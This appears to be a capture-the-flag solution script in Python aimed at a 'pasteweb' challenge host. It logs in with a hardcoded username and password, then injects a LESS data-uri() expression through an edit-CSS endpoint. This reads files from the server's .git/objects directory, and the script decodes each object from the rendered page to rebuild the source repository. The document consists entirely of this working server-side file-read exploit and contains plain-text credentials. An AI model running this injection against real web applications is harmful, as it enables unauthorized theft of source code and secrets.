import requests
import sys
import os
import base64
from time import time
from urllib.parse import quote
from bs4 import BeautifulSoup

url = "https://pasteweb.ctf.zoolab.org"
sess = requests.Session()

def getReq(sessid: str, dest: str, param: dict = None):
    cookies = {
        "PHPSESSID": sessid
    }

    get = str()
    if param is not None:
        get = "?" + "&".join([f"{k}={quote(v)}" for k, v in param.items()])

    res = sess.get(url + dest + get, cookies=cookies)
    return res

def postReq(sessid: str, dest: str, data: dict = None):
    cookies = {
        "PHPSESSID": sessid
    }

    res = sess.post(url + dest, cookies=cookies, data=data)
    return res

def login():
    data = {
        "username": "p69",
        "password": "IGldNRiLSejE0grC6xAk",
        "current_time": int(time())
    }

    sess.post(url, data=data)
    return sess.cookies.get("PHPSESSID")

def main():
    hash = sys.argv[1]

    if os.path.exists(hash):
        return

    sessid = login()

    res = postReq(
        sessid,
        "/editcss.php",
        {
            "less": "body{background: data-uri('/var/www/html/.git/objects/" + f"{hash[:2]}/{hash[2:]}" + "');}"
        }
    )

    res = getReq(sessid, "/view.php")
    soup = BeautifulSoup(res.content, "html.parser")

    obj = soup.find("style").contents[0].string.split()[3].split(",")[-1][:-3]
    obj = base64.b64decode(obj)

    with open(hash[2:], "wb") as f:
        f.write(obj)

if __name__ == "__main__":
    if len(sys.argv) == 2:
        main()